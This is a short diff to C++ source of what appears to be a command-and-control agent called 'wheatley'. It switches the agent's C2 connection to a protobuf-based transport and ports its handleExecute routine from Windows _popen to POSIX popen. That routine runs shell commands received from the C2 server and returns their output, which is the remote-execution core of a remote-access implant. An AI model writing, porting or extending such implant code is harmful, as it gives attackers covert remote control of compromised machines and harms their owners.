@@ -1,6 +1,7 @@
 #include <stdexcept>
 #include <iostream>
 #include <fstream>
+#include <wheatley/common/stdio.hpp>
 #include <wheatley/common/agent.hpp>
 #include <wheatley_protos/commands.pb.h>
 #include <wheatley_protos/chunked_transfer.pb.h>
@@ -33,7 +34,7 @@ void Agent::run(const std::string& ip, int port)
 
 void Agent::c2Connect(const std::string& ip, int port)
 {
-	m_connection.reset(new network::TcpConnection(ip, port));
+	m_connection.reset(new network::ProtobufConnection(ip, port));
 }
 
 void Agent::c2Disconnect()
@@ -108,14 +109,14 @@ std::string Agent::handleExecute(const std::string &command)
 {
     std::array<char, 128> buffer;
     std::string result;
-    auto pipe = _popen(command.c_str(), "r");
+    auto pipe = popen(command.c_str(), "r");
     if (!pipe) {
         return "Error: Failed to open pipe for command execution.";
     }
     while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
         result += buffer.data();
     }
-    _pclose(pipe);
+    pclose(pipe);
     return result;
 }
 
